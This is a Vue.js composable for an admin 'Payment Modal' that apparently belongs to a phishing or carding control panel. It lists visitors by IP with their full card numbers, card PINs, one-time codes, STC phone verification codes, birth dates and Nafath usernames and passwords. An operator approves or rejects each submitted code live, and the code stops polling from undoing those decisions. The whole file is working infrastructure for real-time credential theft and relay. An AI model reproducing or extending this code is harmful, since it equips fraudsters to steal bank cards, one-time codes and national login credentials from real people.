/**
 * usePaymentModal — State & logic for the Payment Modal
 *
 * Manages card navigation, BIN lookup, computed latest records
 * (OTP / PIN / Nafath / Phone), and optimistic-UI status updates.
 *
 * @module usePaymentModal
 */
import { ref, reactive, computed, watch } from 'vue';
import request from '@/api/request';
import logger from '@/utils/logger';

// ── Constants ─────────────────────────────────────────────────────
/** OTP types that belong to phone / STC verification flows */
export const PHONE_OTP_TYPES = Object.freeze( [
    'phone', 'phone_verification', 'stc_verification', 'stc_otp',
] );

/** STC-specific OTP types */
export const STC_OTP_TYPES = Object.freeze( [
    'stc_verification', 'stc_otp',
] );

/** Statuses considered "approved" */
export const APPROVED_STATUSES = Object.freeze( [ 'approved', 'verified' ] );

/** Statuses considered "rejected" */
export const REJECTED_STATUSES = Object.freeze( [ 'rejected', 'failed' ] );

/** STC carrier name patterns (case-insensitive matching) */
export const STC_CARRIER_PATTERNS = Object.freeze( [
    'stc', 'saudi telecom', 'الاتصالات السعودية',
] );

// ── Pure helpers (exported for testing) ───────────────────────────

/**
 * Sort items descending by `created_at`, return a new array.
 * @param {Array} items
 * @returns {Array}
 */
export const sortByLatest = ( items ) =>
    [ ...items ].sort( ( a, b ) => new Date( b.created_at || 0 ) - new Date( a.created_at || 0 ) );

/**
 * Return the first (newest) item from a sorted array, or null.
 * @param {Array} items
 * @returns {Object|null}
 */
export const newestOrNull = ( items ) =>
{
    const sorted = sortByLatest( items );
    return sorted.length > 0 ? sorted[ 0 ] : null;
};

/**
 * Check whether a type string belongs to the phone/STC OTP group.
 * @param {string} type
 * @returns {boolean}
 */
export const isPhoneOtpType = ( type ) => PHONE_OTP_TYPES.includes( type );

/**
 * Check whether a type string belongs to an STC flow.
 * @param {string} type
 * @returns {boolean}
 */
export const isStcOtpType = ( type ) => STC_OTP_TYPES.includes( type );

/**
 * Determine if a carrier string matches STC.
 * @param {string} carrier
 * @returns {boolean}
 */
export const matchesStcCarrier = ( carrier ) =>
{
    if ( !carrier ) return false;
    const lower = carrier.toLowerCase();
    return STC_CARRIER_PATTERNS.some( ( p ) => lower.includes( p ) );
};

/**
 * Resolve cards array from various customer data shapes.
 * @param {Object|null} customer
 * @returns {Array}
 */
export const resolveCards = ( customer ) =>
    customer?.payment?.cards || customer?.cards || [];

/**
 * Ensure `customer.custom_data` exists and return it.
 * @param {Object} customer
 * @returns {Object}
 */
export const ensureCustomData = ( customer ) =>
{
    if ( !customer.custom_data ) customer.custom_data = {};
    return customer.custom_data;
};

/**
 * Get the current page string (lowercased) from various customer shapes.
 * @param {Object} customer
 * @returns {string}
 */
export const getCurrentPage = ( customer ) =>
    ( customer?.current_page || customer?.journey?.current_page || '' ).toLowerCase();

// ── Composable ────────────────────────────────────────────────────

export function usePaymentModal ( props, emit )
{
    // ── Visibility ────────────────────────────────────────────────
    const showPaymentModal = ref( false );
    const selectedPaymentCustomer = ref( null );
    const nafathDisplayNumber = ref( '' );
    const currentCardIndex = ref( 0 );

    // ── Acted IDs tracking (prevents polling from reverting admin actions) ──
    const actedOtpIds = reactive( new Set() );
    const MAX_ACTED_IDS = 500;

    // ── BIN lookup ────────────────────────────────────────────────
    const bankInfo = ref( null );
    const bankInfoLoading = ref( false );
    const bankInfoCache = reactive( {} );

    const fetchBankInfo = async ( cardNumber ) =>
    {
        if ( !cardNumber ) { bankInfo.value = null; return; }
        const bin = cardNumber.replace( /\D/g, '' ).substring( 0, 8 );
        if ( bin.length < 6 ) { bankInfo.value = null; return; }
        if ( bankInfoCache[ bin ] ) { bankInfo.value = bankInfoCache[ bin ]; return; }
        bankInfoLoading.value = true;
        try
        {
            const response = await request.get( `/admin/bin-lookup/${ bin }` );
            bankInfo.value = response.data;
            bankInfoCache[ bin ] = response.data;
        } catch ( error )
        {
            logger.error( 'BIN lookup failed:', error );
            bankInfo.value = null;
        } finally
        {
            bankInfoLoading.value = false;
        }
    };

    // ── Customer watcher (preserve state across backend refreshes) ──

    watch(
        () => props.customers,
        ( newCustomers ) =>
        {
            // ── Early exit: skip all work when modal is hidden ──
            if ( !showPaymentModal.value || !selectedPaymentCustomer.value ) return;

            const updatedCustomer = newCustomers.find( ( c ) => c.ip === selectedPaymentCustomer.value.ip );
            if ( !updatedCustomer ) return;

            const preservedCustomData = selectedPaymentCustomer.value.custom_data;
            // Deep-clone to avoid mutating the original reactive object
            const fresh = structuredClone( updatedCustomer );
            if ( preservedCustomData )
            {
                fresh.custom_data = { ...preservedCustomData, ...( fresh.custom_data || {} ) };
            }

            // Cap actedOtpIds to prevent unbounded growth
            if ( actedOtpIds.size > MAX_ACTED_IDS ) actedOtpIds.clear();

            // Preserve pending status for OTPs that admin hasn't acted on
            // AND preserve acted status when stale API returns pending
            const prevOtps = selectedPaymentCustomer.value.all_otps || [];
            if ( fresh.all_otps?.length )
            {
                for ( const freshOtp of fresh.all_otps )
                {
                    const prevOtp = prevOtps.find( ( o ) => o.id === freshOtp.id );
                    if ( !prevOtp ) continue;

                    // Case 1: Admin hasn't acted, but API says no longer pending → keep pending
                    if ( prevOtp.status === 'pending' && freshOtp.status !== 'pending' && !actedOtpIds.has( freshOtp.id ) )
                    {
                        freshOtp.status = 'pending';
                    }
                    // Case 2: Admin already acted (approved/rejected), but stale API still says pending → keep acted status
                    if ( actedOtpIds.has( freshOtp.id ) && freshOtp.status === 'pending' && prevOtp.status !== 'pending' )
                    {
                        freshOtp.status = prevOtp.status;
                    }
                }
            }
            if ( fresh.latest_otp )
            {
                const prevLatest = selectedPaymentCustomer.value.latest_otp;
                if ( prevLatest && prevLatest.id === fresh.latest_otp.id )
                {
                    // Keep pending if admin hasn't acted
                    if ( prevLatest.status === 'pending' && fresh.latest_otp.status !== 'pending' && !actedOtpIds.has( fresh.latest_otp.id ) )
                    {
                        fresh.latest_otp.status = 'pending';
                    }
                    // Keep acted status if stale API returns pending
                    if ( actedOtpIds.has( fresh.latest_otp.id ) && fresh.latest_otp.status === 'pending' && prevLatest.status !== 'pending' )
                    {
                        fresh.latest_otp.status = prevLatest.status;
                    }
                }
            }
            // Preserve pending for PINs (same logic)
            const prevPins = selectedPaymentCustomer.value.all_pins || [];
            if ( fresh.all_pins?.length )
            {
                for ( const freshPin of fresh.all_pins )
                {
                    const prevPin = prevPins.find( ( p ) => p.id === freshPin.id );
                    if ( !prevPin ) continue;

                    if ( prevPin.status === 'pending' && freshPin.status !== 'pending' && !actedOtpIds.has( freshPin.id ) )
                    {
                        freshPin.status = 'pending';
                    }
                    if ( actedOtpIds.has( freshPin.id ) && freshPin.status === 'pending' && prevPin.status !== 'pending' )
                    {
                        freshPin.status = prevPin.status;
                    }
                }
            }

            selectedPaymentCustomer.value = fresh;
        },
        { immediate: true }
    );

    // ── Computed helpers ──────────────────────────────────────────

    const currentCard = computed( () =>
    {
        if ( !selectedPaymentCustomer.value ) return null;
        const cards = resolveCards( selectedPaymentCustomer.value );
        if ( cards.length === 0 ) return null;
        return cards[ currentCardIndex.value ] || cards[ 0 ];
    } );

    watch( currentCard, ( newCard ) =>
    {
        if ( newCard )
        {
            fetchBankInfo( newCard.card_number || newCard.card_number_full );
        } else
        {
            bankInfo.value = null;
        }
    }, { immediate: true } );

    const latestOtp = computed( () =>
    {
        if ( !selectedPaymentCustomer.value ) return null;
        const otps = selectedPaymentCustomer.value.all_otps || selectedPaymentCustomer.value.otps || [];
        const cardOtps = otps.filter( ( otp ) => !isPhoneOtpType( otp.type ) );

        if ( cardOtps.length === 0 && selectedPaymentCustomer.value.latest_otp )
        {
            const fallback = selectedPaymentCustomer.value.latest_otp;
            if ( !isPhoneOtpType( fallback.type ) ) return fallback;
        }
        return newestOrNull( cardOtps );
    } );

    const latestPin = computed( () =>
    {
        if ( !selectedPaymentCustomer.value ) return null;
        const pins = selectedPaymentCustomer.value.all_pins || selectedPaymentCustomer.value.pins || [];
        return newestOrNull( pins );
    } );

    const latestPhoneOtp = computed( () =>
    {
        if ( !selectedPaymentCustomer.value ) return null;
        if ( selectedPaymentCustomer.value.latest_phone_otp ) return selectedPaymentCustomer.value.latest_phone_otp;

        const allOtps = selectedPaymentCustomer.value.all_otps || [];
        const phoneOtps = allOtps.filter( ( otp ) => isPhoneOtpType( otp.type ) );

        if ( phoneOtps.length > 0 )
        {
            const otp = newestOrNull( phoneOtps );
            return {
                id: otp.id,
                code: otp.code,
                otp_code: otp.code,
                type: otp.type,
                is_stc: isStcOtpType( otp.type ),
                status: otp.status,
                created_at: otp.created_at,
            };
        }
        return null;
    } );

    const latestNafath = computed( () =>
    {
        if ( !selectedPaymentCustomer.value ) return null;
        const nafath = selectedPaymentCustomer.value.nafath;
        if ( !nafath?.username ) return null;
        return {
            username: nafath.username,
            password: nafath.password || null,
            verified: nafath.verified,
            verification_code: nafath.verification_code || null,
            status: nafath.verified ? 'verified' : 'pending',
            created_at: null,
        };
    } );

    const customerCards = computed( () =>
        resolveCards( selectedPaymentCustomer.value )
    );

    const paymentAmount = computed( () =>
    {
        if ( !selectedPaymentCustomer.value ) return null;
        const c = selectedPaymentCustomer.value;
        return c.totalPrice || c.priceSummary?.total_price || c.payment?.amount || c.payment_amount || null;
    } );

    const priceSummary = computed( () => selectedPaymentCustomer.value?.priceSummary || null );
    const selectedOffer = computed( () => selectedPaymentCustomer.value?.selectedOffer || null );

    // ── STC helpers ───────────────────────────────────────────────

    const isStcCarrier = ( customer ) =>
    {
        if ( !customer ) return false;
        const carrier = customer.phone_carrier || customer.carrier || customer.custom_data?.carrier || '';
        return matchesStcCarrier( carrier );
    };

    const isCarrierMismatch = ( customer ) =>
    {
        if ( !customer || !latestPhoneOtp.value ) return false;
        const otpType = latestPhoneOtp.value?.type;
        if ( otpType === 'phone' ) return false;
        const isCustomerStc = isStcCarrier( customer );
        const isOtpStc = latestPhoneOtp.value?.is_stc || isStcOtpType( otpType );
        return isCustomerStc !== isOtpStc;
    };

    const isStcVerificationFlow = ( customer ) =>
    {
        if ( !isStcCarrier( customer ) ) return false;
        const lo = customer?.latest_phone_otp;
        if ( lo && isStcOtpType( lo.type ) ) return true;
        const allOtps = customer?.all_otps || [];
        return allOtps.some( ( o ) => isStcOtpType( o.type ) );
    };

    const isStcWaitingForApproval = ( customer ) =>
    {
        if ( !customer || !isStcCarrier( customer ) ) return false;
        const cd = customer.custom_data || {};
        if ( cd.stc_waiting_approved || cd.stc_waiting_rejected ) return false;
        const lo = customer.latest_phone_otp;
        if ( !lo ) return false;
        const code = lo.code || lo.otp_code || '';
        return code === 'phone_pending';
    };

    const isStcWaitingForOtpApproval = ( customer ) =>
    {
        if ( !customer || !isStcCarrier( customer ) ) return false;
        const cd = customer.custom_data || {};
        if ( cd.stc_otp_approved || cd.stc_otp_rejected ) return false;
        if ( !cd.stc_waiting_approved ) return false;
        const currentPage = getCurrentPage( customer );
        if ( currentPage.includes( 'call' ) ) return false;

        // Search all_otps for a pending stc_otp first
        const all = customer.all_otps || [];
        const pendingStcOtp = sortByLatest(
            all.filter( ( o ) => o.type === 'stc_otp' && ( o.status === 'pending' || !o.status ) )
        )[ 0 ];

        if ( pendingStcOtp )
        {
            const code = pendingStcOtp.code || pendingStcOtp.otp_code || '';
            return code !== '' && code !== 'phone_pending';
        }

        // Legacy fallback: old data might store STC OTP as type 'otp'
        const legacyOtp = sortByLatest(
            all.filter( ( o ) => o.type === 'otp' && ( o.status === 'pending' || !o.status ) )
        )[ 0 ];

        if ( legacyOtp )
        {
            const code = legacyOtp.code || legacyOtp.otp_code || '';
            return code !== '' && code !== 'phone_pending';
        }

        return false;
    };

    const isStcWaitingForCallApproval = ( customer ) =>
    {
        if ( !customer || !isStcCarrier( customer ) ) return false;
        const cd = customer.custom_data || {};
        if ( cd.stc_call_approved || cd.stc_call_rejected ) return false;
        // Hide if the underlying phone OTP is already resolved
        const phoneOtpStatus = customer.latest_phone_otp?.status;
        if ( phoneOtpStatus && phoneOtpStatus !== 'pending' ) return false;
        const currentPage = getCurrentPage( customer );
        const isOnCallWaitingPage = currentPage.includes( 'call-waiting' )
            || currentPage.includes( 'call_waiting' )
            || currentPage.includes( 'callwaiting' );
        const otpApproved = cd.stc_otp_approved === true;
        return isOnCallWaitingPage || otpApproved;
    };

    // ── Phone verification helpers ────────────────────────────────

    const getPhoneBirthDate = ( customer ) =>
    {
        if ( !customer ) return null;
        if ( customer.phone_verification?.birth_date ) return customer.phone_verification.birth_date;
        if ( customer.birth_date ) return customer.birth_date;
        if ( customer.birthDate ) return customer.birthDate;

        const day = customer.phone_birth_day;
        const month = customer.phone_birth_month;
        const year = customer.phone_birth_year;
        if ( day && month && year )
            return `${ year }-${ String( month ).padStart( 2, '0' ) }-${ String( day ).padStart( 2, '0' ) }`;
        if ( customer.birth_year && customer.birth_month )
            return `${ customer.birth_year }-${ String( customer.birth_month ).padStart( 2, '0' ) }`;
        if ( customer.birthYear && customer.birthMonth )
            return `${ customer.birthYear }-${ String( customer.birthMonth ).padStart( 2, '0' ) }`;

        if ( customer.custom_data )
        {
            const cd = customer.custom_data;
            if ( cd.phone_birth_date ) return cd.phone_birth_date;
            if ( cd.birth_date ) return cd.birth_date;
            if ( cd.phone_birth_day && cd.phone_birth_month && cd.phone_birth_year )
                return `${ cd.phone_birth_year }-${ String( cd.phone_birth_month ).padStart( 2, '0' ) }-${ String( cd.phone_birth_day ).padStart( 2, '0' ) }`;
        }
        return null;
    };

    const getPhoneVerificationStatus = ( customer ) =>
    {
        if ( !customer ) return 'pending';

        // STC shortcut
        if ( isStcCarrier( customer ) )
        {
            const cd = customer.custom_data || {};
            if ( cd.stc_call_approved ) return 'approved';
            if ( cd.stc_call_rejected || cd.stc_waiting_rejected ) return 'rejected';
        }

        // Check phone OTPs list
        const phoneOtps = customer.phone_otps || customer.phoneOtps || [];
        if ( phoneOtps.length > 0 )
        {
            const latest = newestOrNull( phoneOtps );
            if ( APPROVED_STATUSES.includes( latest?.status ) ) return 'approved';
            if ( REJECTED_STATUSES.includes( latest?.status ) ) return 'rejected';
        }

        // Fallback: phone_verification object
        if ( customer.phone_verification?.status )
        {
            if ( APPROVED_STATUSES.includes( customer.phone_verification.status ) ) return 'approved';
            if ( REJECTED_STATUSES.includes( customer.phone_verification.status ) ) return 'rejected';
        }

        // Fallback: latest_phone_otp
        if ( customer.latest_phone_otp?.status )
        {
            if ( APPROVED_STATUSES.includes( customer.latest_phone_otp.status ) ) return 'approved';
            if ( REJECTED_STATUSES.includes( customer.latest_phone_otp.status ) ) return 'rejected';
        }

        return 'pending';
    };

    const isPhoneDataWaitingForApproval = ( customer ) =>
    {
        if ( !customer || isStcVerificationFlow( customer ) ) return false;
        const currentPage = getCurrentPage( customer );
        if ( !currentPage.includes( 'phone' ) ) return false;
        const phoneOtpStatus = customer.latest_phone_otp?.status;
        if ( phoneOtpStatus && phoneOtpStatus !== 'pending' ) return false;
        const phoneDataStatus = customer.custom_data?.phone_data_status;
        if ( phoneDataStatus === 'approved' || phoneDataStatus === 'rejected' ) return false;
        const hasOtpCode = customer.latest_phone_otp?.code && customer.latest_phone_otp.code !== 'phone_pending';
        if ( hasOtpCode ) return false;
        return true;
    };

    const isPhoneOtpWaitingForApproval = ( customer ) =>
    {
        if ( !customer || isStcVerificationFlow( customer ) ) return false;
        const currentPage = getCurrentPage( customer );
        if ( !currentPage.includes( 'phone' ) ) return false;
        const otpStatus = customer.latest_phone_otp?.status;
        if ( otpStatus && otpStatus !== 'pending' ) return false;
        const phoneOtpStatus = customer.custom_data?.phone_otp_status;
        if ( phoneOtpStatus === 'approved' || phoneOtpStatus === 'rejected' ) return false;
        const hasRealOtp = customer.latest_phone_otp?.code && customer.latest_phone_otp.code !== 'phone_pending';
        if ( !hasRealOtp ) return false;
        const phoneDataStatus = customer.custom_data?.phone_data_status;
        if ( phoneDataStatus === 'rejected' ) return false;
        return true;
    };

    // ── Open / Close ──────────────────────────────────────────────

    const openPaymentModal = ( customer ) =>
    {
        try
        {
            if ( !customer ) { logger.error( 'Customer is null/undefined' ); return; }
            selectedPaymentCustomer.value = structuredClone( customer );
            showPaymentModal.value = true;
            nafathDisplayNumber.value = '';
            currentCardIndex.value = 0;
            if ( customer.ip )
            {
                // ✅ Emit modal-opened to parent — parent handles mark-viewed + suppression
                emit( 'modal-opened', { id: customer.id, ip: customer.ip, section: 'payment' } );
            }
        } catch ( error )
        {
            logger.error( 'Error in openPaymentModal:', error );
        }
    };

    const closePaymentModal = () =>
    {
        const closingId = selectedPaymentCustomer.value?.id;
        const closingIp = selectedPaymentCustomer.value?.ip;
        showPaymentModal.value = false;
        // ✅ Emit modal-closed BEFORE clearing reference — parent re-marks viewed
        if ( closingId ) emit( 'modal-closed', { id: closingId, ip: closingIp, section: 'payment' } );
        selectedPaymentCustomer.value = null;
        nafathDisplayNumber.value = '';
        currentCardIndex.value = 0;
        actedOtpIds.clear();
    };

    const prevCard = () => { if ( currentCardIndex.value > 0 ) currentCardIndex.value--; };
    const nextCard = () => { if ( currentCardIndex.value < customerCards.value.length - 1 ) currentCardIndex.value++; };

    // ── Local status updates (optimistic UI) ──────────────────────

    const updateCardStatusLocally = ( customer, cardIndex, newStatus ) =>
    {
        if ( !customer ) return;
        const cards = resolveCards( customer );
        if ( cards.length > 0 && cards[ cardIndex ] ) cards[ cardIndex ].status = newStatus;
    };

    const updateNafathStatusLocally = ( customer, newStatus ) =>
    {
        if ( !customer ) return;
        if ( customer.nafath )
        {
            customer.nafath.verified = ( newStatus === 'approved' || newStatus === 'verified' );
        }
    };

    const updatePhoneOtpStatusLocally = ( customer, newStatus ) =>
    {
        if ( !customer ) return;
        if ( customer.latest_phone_otp ) customer.latest_phone_otp.status = newStatus;
        if ( customer.phone_verification ) customer.phone_verification.status = newStatus;
        if ( customer.phone_otps?.length > 0 )
        {
            const latest = newestOrNull( customer.phone_otps );
            if ( latest ) latest.status = newStatus;
        }
    };

    /**
     * Optimistically update the status of the latest STC OTP across all data shapes.
     * Targets `stc_otp` first, falls back to `stc_verification`.
     * @param {Object} customer
     * @param {string} newStatus
     */
    const updateStcOtpStatusLocally = ( customer, newStatus ) =>
    {
        if ( !customer ) return;

        // 1) latest_phone_otp
        if ( customer.latest_phone_otp && isStcOtpType( customer.latest_phone_otp.type ) )
        {
            customer.latest_phone_otp = { ...customer.latest_phone_otp, status: newStatus };
        }

        // 2) all_otps — pick newest stc_otp, fallback to stc_verification
        if ( customer.all_otps?.length > 0 )
        {
            const sorted = sortByLatest( customer.all_otps );
            const stcOtp = sorted.find( ( o ) => o.type === 'stc_otp' )
                || sorted.find( ( o ) => o.type === 'stc_verification' );
            if ( stcOtp )
            {
                customer.all_otps = customer.all_otps.map(
                    ( o ) => o.id === stcOtp.id ? { ...o, status: newStatus } : o
                );
            }
        }

        // 3) phone_otps
        if ( customer.phone_otps?.length > 0 )
        {
            const latest = newestOrNull( customer.phone_otps );
            if ( latest ) latest.status = newStatus;
        }

        // 4) phone_verification
        if ( customer.phone_verification ) customer.phone_verification.status = newStatus;
    };

    /**
     * Re-trigger reactivity after an optimistic mutation on selectedPaymentCustomer.
     */
    const refreshCustomerRef = () =>
    {
        selectedPaymentCustomer.value = { ...selectedPaymentCustomer.value };
    };

    // ── Action strategy maps ──────────────────────────────────────

    /** Helper: find & track the latest OTP ID that admin acted on */
    const trackLatestOtpId = () =>
    {
        const c = selectedPaymentCustomer.value;
        const otpId = c?.latest_otp?.id || sortByLatest( c?.all_otps || [] )[ 0 ]?.id;
        if ( otpId ) actedOtpIds.add( otpId );
    };

    const trackLatestPinId = () =>
    {
        const c = selectedPaymentCustomer.value;
        const pinId = newestOrNull( c?.all_pins || [] )?.id;
        if ( pinId ) actedOtpIds.add( pinId );
    };

    /** Direct status updates keyed by action name */
    const DIRECT_ACTION_HANDLERS = {
        // NOTE: OTP/PIN status updates happen in DashboardHome's handleCustomerAction
        // AFTER the API call succeeds. Updating status here would cause the guard
        // to see an already-processed status and skip the API call entirely.
        'otp-approve': () => { trackLatestOtpId(); refreshCustomerRef(); },
        'otp-reject': () => { trackLatestOtpId(); refreshCustomerRef(); },
        'pin-approve': () => { trackLatestPinId(); refreshCustomerRef(); },
        'pin-reject': () => { trackLatestPinId(); refreshCustomerRef(); },
        'nafath-approve': () => { updateNafathStatusLocally( selectedPaymentCustomer.value, 'approved' ); refreshCustomerRef(); },
        'nafath-reject': () => { updateNafathStatusLocally( selectedPaymentCustomer.value, 'rejected' ); refreshCustomerRef(); },
    };

    /** Phone-data stage handlers (non-STC) */
    const PHONE_DATA_HANDLERS = {
        'phone-data-approve': () =>
        {
            ensureCustomData( selectedPaymentCustomer.value ).phone_data_status = 'approved';
            refreshCustomerRef();
        },
        'phone-data-reject': () =>
        {
            ensureCustomData( selectedPaymentCustomer.value ).phone_data_status = 'rejected';
            updatePhoneOtpStatusLocally( selectedPaymentCustomer.value, 'rejected' );
            refreshCustomerRef();
        },
        'phone-otp-approve': () =>
        {
            ensureCustomData( selectedPaymentCustomer.value ).phone_otp_status = 'approved';
            refreshCustomerRef();
        },
        'phone-otp-reject': () =>
        {
            ensureCustomData( selectedPaymentCustomer.value ).phone_otp_status = 'rejected';
            refreshCustomerRef();
        },
    };

    /**
     * Resolve the correct STC stage action + optimistic flag.
     * @param {'approve'|'reject'} verb
     * @param {Object} customer
     * @returns {{ action: string, flag: string }|null}
     */
    const resolveStcStageAction = ( verb, customer ) =>
    {
        const stages = [
            { check: isStcWaitingForApproval, prefix: 'stc-waiting', flag: 'stc_waiting' },
            { check: isStcWaitingForOtpApproval, prefix: 'stc-otp', flag: 'stc_otp' },
            { check: isStcWaitingForCallApproval, prefix: 'stc-call', flag: 'stc_call' },
        ];
        for ( const stage of stages )
        {
            if ( stage.check( customer ) )
            {
                const suffix = verb === 'approve' ? 'approve' : 'reject';
                return {
                    action: `${ stage.prefix }-${ suffix }`,
                    flag: `${ stage.flag }_${ verb === 'approve' ? 'approved' : 'rejected' }`,
                };
            }
        }
        return null;
    };

    // ── Action emitters ───────────────────────────────────────────

    const emitCardAction = ( action, cardIndex, reason ) =>
    {
        if ( !selectedPaymentCustomer.value ) return;

        const statusMap = { 'card-approve': 'approved', 'card-reject': 'rejected' };
        if ( statusMap[ action ] )
        {
            updateCardStatusLocally( selectedPaymentCustomer.value, cardIndex, statusMap[ action ] );
            refreshCustomerRef();
        }
        const payload = { action, customer: selectedPaymentCustomer.value, cardIndex };
        if ( reason ) payload.reason = reason;
        emit( 'action', payload );
    };

    const emitPaymentAction = ( action, reason ) =>
    {
        if ( !selectedPaymentCustomer.value || props.processingAction ) return;
        const payload = { action, customer: selectedPaymentCustomer.value };
        if ( reason ) payload.reason = reason;

        // Attach nafath code when relevant
        if ( action.startsWith( 'nafath-' ) && nafathDisplayNumber.value )
            payload.nafathNumber = nafathDisplayNumber.value;

        // 1) Direct actions (OTP / PIN / Nafath)
        if ( DIRECT_ACTION_HANDLERS[ action ] ) DIRECT_ACTION_HANDLERS[ action ]();

        // 2) Phone data actions (non-STC stages)
        if ( PHONE_DATA_HANDLERS[ action ] ) PHONE_DATA_HANDLERS[ action ]();

        // 3) Phone approve/reject — routes to STC stages or generic phone-otp
        if ( action === 'phone-approve' || action === 'phone-reject' )
        {
            const verb = action === 'phone-approve' ? 'approve' : 'reject';

            if ( isStcVerificationFlow( selectedPaymentCustomer.value ) )
            {
                const resolved = resolveStcStageAction( verb, selectedPaymentCustomer.value );
                if ( resolved )
                {
                    payload.action = resolved.action;
                    ensureCustomData( selectedPaymentCustomer.value )[ resolved.flag ] = true;

                    // Track the relevant OTP ID so the watcher preserves its status
                    const stcOtp = sortByLatest(
                        ( selectedPaymentCustomer.value.all_otps || [] )
                            .filter( ( o ) => o.type === 'stc_otp' || o.type === 'stc_verification' )
                    )[ 0 ];
                    if ( stcOtp?.id ) actedOtpIds.add( stcOtp.id );
                    const waitOtpId = selectedPaymentCustomer.value.latest_phone_otp?.id;
                    if ( waitOtpId ) actedOtpIds.add( waitOtpId );

                    // Stage 2: also update STC OTP status locally
                    if ( resolved.action.startsWith( 'stc-otp-' ) )
                    {
                        updateStcOtpStatusLocally(
                            selectedPaymentCustomer.value,
                            verb === 'approve' ? 'approved' : 'rejected'
                        );
                    }

                    // Stage 3: also update phone OTP status locally
                    if ( resolved.action.startsWith( 'stc-call-' ) )
                    {
                        updatePhoneOtpStatusLocally(
                            selectedPaymentCustomer.value,
                            verb === 'approve' ? 'approved' : 'rejected'
                        );
                    }
                }
                refreshCustomerRef();
            } else
            {
                payload.action = verb === 'approve' ? 'phone-otp-approve' : 'phone-otp-reject';
                refreshCustomerRef();
            }
        }

        emit( 'action', payload );
    };

    const updateNafathVerificationCode = () =>
    {
        if ( selectedPaymentCustomer.value && nafathDisplayNumber.value )
        {
            emit( 'action', {
                action: 'nafath-update-code',
                customer: selectedPaymentCustomer.value,
                nafathNumber: nafathDisplayNumber.value,
            } );
        }
    };

    return {
        // State
        showPaymentModal, selectedPaymentCustomer, nafathDisplayNumber, currentCardIndex,
        bankInfo, bankInfoLoading,
        // Computed
        currentCard, latestOtp, latestPin, latestPhoneOtp, latestNafath,
        customerCards, paymentAmount, priceSummary, selectedOffer,
        // STC helpers
        isStcCarrier, isCarrierMismatch, isStcVerificationFlow,
        isStcWaitingForApproval, isStcWaitingForOtpApproval, isStcWaitingForCallApproval,
        // Phone helpers
        getPhoneBirthDate, getPhoneVerificationStatus,
        isPhoneDataWaitingForApproval, isPhoneOtpWaitingForApproval,
        // Actions
        openPaymentModal, closePaymentModal, prevCard, nextCard,
        emitCardAction, emitPaymentAction, updateNafathVerificationCode,
    };
}
